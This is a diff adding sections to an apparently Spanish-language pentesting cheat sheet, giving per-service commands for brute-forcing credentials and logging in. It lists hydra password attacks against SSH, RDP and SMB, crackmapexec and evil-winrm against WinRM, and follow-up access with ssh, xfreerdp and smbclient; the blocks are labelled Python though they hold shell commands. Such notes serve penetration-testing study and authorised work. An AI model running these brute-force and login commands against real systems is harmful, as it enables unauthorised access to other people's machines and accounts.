@@ -6,3 +6,20 @@ MSFVENOM es una herramienta que viene integrada en metasploit framework que sirv
 ```python
 crackmapexec winrm IP -u user.list -p password.list
 evil-winrm -i IP -u user -p password (tenemos credenciales arriba y esto es para hacer login)
+```
+### SSH (22)
+```python
+hydra -L user.list -P password.list ssh://IP
+ssh user@IP (para ganar acceso al sistema con las credenciales descubiertas)
+```
+### RDP (3389)
+```python
+hydra -L user.list -P password.list rdp://IP
+xfreerdp /v:IP /u:user /p:password (para ganar acceso al sistema con las credenciales descubiertas)
+```
+### SMB (445)
+```python
+hydra -L user.list -P password.list smb://IP
+crackmapexec smb IP -u "user" -p "password" --shares
+smbclient -U user \\\\IP\\SHARENAME
+```
